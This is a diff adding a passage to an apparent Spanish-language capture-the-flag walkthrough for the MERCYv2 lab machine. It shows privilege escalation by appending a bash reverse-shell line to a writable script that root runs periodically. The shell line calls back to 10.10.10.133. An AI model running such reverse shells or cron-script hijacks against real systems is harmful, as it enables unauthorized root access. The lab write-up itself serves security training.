@@ -442,22 +442,36 @@ Saved as: webshell.war
 
 <img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy19.jpg" width=80% />
 
+- El archivo TIMECLOCK es un archivo que escribe la hora en el servidor web. Aunque busqué en los archivos CRONTAB y no encontré nada, era evidente que se ejecutaba periodicamente y con privilegios de ROOT.
 
+```
+fluffy@MERCY:~/.private/secrets$ cat timeclock
+cat timeclock
+#!/bin/bash
 
+now=$(date)
+echo "The system time is: $now." > ../../../../../var/www/html/time
+echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
+chown www-data:www-data ../../../../../var/www/html/time
+```
 
+- Ya que tenemos permisos para editarlo, vamos a modificarlo para obtener una conexión reversa con privilegios de ROOT.
 
+```
+fluffy@MERCY:~/.private/secrets$ echo "bash -i >& /dev/tcp/10.10.10.133/666 0>&1" >> timeclock
+" >> timeclock>& /dev/tcp/10.10.10.133/666 0>&1 
+fluffy@MERCY:~/.private/secrets$ cat timeclock
+cat timeclock
+#!/bin/bash
 
+now=$(date)
+echo "The system time is: $now." > ../../../../../var/www/html/time
+echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
+chown www-data:www-data ../../../../../var/www/html/time
+bash -i >& /dev/tcp/10.10.10.133/666 0>&1
+```
 
-
-
-
-
-
-
-
-
-
-
+<img src="https://github.com/El-Palomo/MERCYv2/blob/main/mercy20.jpg" width=80% />
 
 
 
